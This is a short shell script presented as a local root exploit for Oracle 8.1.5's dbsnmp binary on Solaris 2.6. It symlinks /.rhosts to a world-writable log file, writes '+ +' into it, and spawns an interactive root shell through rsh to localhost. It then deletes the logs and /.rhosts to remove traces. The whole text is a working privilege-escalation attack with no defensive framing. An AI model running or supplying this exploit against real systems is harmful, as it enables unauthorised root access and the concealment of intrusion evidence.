#!/bin/sh
# Exploit for Oracle 8.1.5 on Solaris 2.6 and probably others
# You'll probably have to change your path to dbsnmp
# Exploit will only work if /.rhosts does NOT exist
#
# Brock Tellier btellier@usa.net
cd /tmp
unset ORACLE_HOME
umask 0000
ln -s /.rhosts /tmp/dbsnmpc.log
/u01/app/oracle/product/8.1.5/bin/dbsnmp
echo "+ +" > /.rhosts
rsh -l root localhost 'sh -i'
rsh -l root localhost rm /tmp/*log*
rsh -l root localhost rm /.rhosts
